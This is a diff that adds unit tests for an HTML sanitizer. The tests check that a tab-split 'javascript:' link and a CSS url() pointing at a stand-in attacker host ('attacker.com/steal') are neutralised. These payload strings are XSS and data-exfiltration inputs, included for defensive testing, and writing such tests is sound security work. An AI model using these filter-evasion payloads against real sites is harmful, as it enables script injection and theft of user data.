@@ -148,5 +148,28 @@ describe("sanitizeHtml — direct-call unit tests", () => {
       const doc = parseHtml(result);
       expect(doc.querySelector("a")?.getAttribute("href")).toBeNull();
     });
+
+    it("strips javascript: URLs with embedded tab whitespace", () => {
+      const result = sanitizeHtml(
+        "<a href='java\tscript:alert(1)'>x</a>",
+        sanitizerConfig,
+      );
+      const doc = parseHtml(result);
+      expect(doc.querySelector("a")?.getAttribute("href")).toBeNull();
+    });
+  });
+
+  describe("style attribute policy", () => {
+    it("neutralizes url() tokens in style attributes", () => {
+      const result = sanitizeHtml(
+        "<div style='background: url(https://attacker.com/steal?d=1)'>t</div>",
+        sanitizerConfig,
+      );
+      const doc = parseHtml(result);
+      const div = doc.querySelector("div");
+      expect(div?.getAttribute("style")).toBeTruthy();
+      expect(div?.getAttribute("style")).toContain("url()");
+      expect(div?.getAttribute("style")).not.toContain("attacker.com");
+    });
   });
 });
